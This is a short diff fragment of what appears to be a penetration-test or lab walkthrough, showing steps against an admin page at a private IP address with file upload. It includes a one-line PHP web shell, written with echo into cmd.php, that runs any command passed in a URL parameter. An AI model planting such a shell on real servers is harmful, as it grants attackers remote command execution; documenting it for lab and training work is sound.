@@ -33,6 +33,7 @@ http://10.150.150.11/admin
 I found file upload functionality
 
 Step 5: Exploitation (Upload Web Shell)
+
 Created a web shell:
 echo '<?php system($_GET["cmd"]); ?>' > cmd.php
 
